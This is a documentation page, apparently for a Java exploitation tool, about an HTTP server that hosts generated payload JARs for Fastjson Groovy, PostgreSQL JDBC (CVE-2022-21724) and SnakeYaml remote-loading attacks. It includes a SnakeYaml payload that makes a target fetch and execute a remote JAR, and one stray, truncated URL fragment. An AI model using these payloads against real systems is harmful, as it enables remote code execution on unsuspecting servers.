---
sidebar_position: 6
---

# HTTP Server

A simple HTTP Server that can mount generated Payloads to HTTP ports, useful for HTTP URL callback scenarios.

## Fastjson Groovy Remote Loading

Gadget name: `GroovyJarConvert`

Use HTTP Server and enable the corresponding HTTP port, select OtherPayload. In the cascade selector, check GroovyJarConvert. This Gadget will process the bytecode into Groovy Jar Payload format (JAR file), and then mount it to an HTTP port through the HTTP Server. After clicking generate, it will create an HTTP link that can be used in fastjson groovy payload.

![](@site/static/doc/fastjson-groovy.png)

## PostgreSQL JDBC Exploitation

Available Gadgets:

- `SpringBeanXmlClassLoader`
- `SpringBeanXmlExec`
- `SpringBeanXmlSpEL`

PostgreSQL (CVE-2022-21724) combined with SpringBean remote XML file loading, executing bytecode with response.

![](@site/static/doc/postgresql-jdbc.png)

![](@site/static/doc/postgresql-jdbc2.png)
om/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

## SnakeYaml Jar Remote Loading

Gadget name: `SnakeyamlJarConvert`

The generation process is similar to the above, no need for further explanation.

Usually used with the following SnakeYaml Payload to achieve remote loading RCE:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [ [
    !!java.net.URL [ "http://127.0.0.1:7777/yaml-payload.jar" ]
  ] ]
]
```

References:

- https://tttang.com/archive/1815/#toc_snakeyaml_1
- https://github.com/artsploit/yaml-payload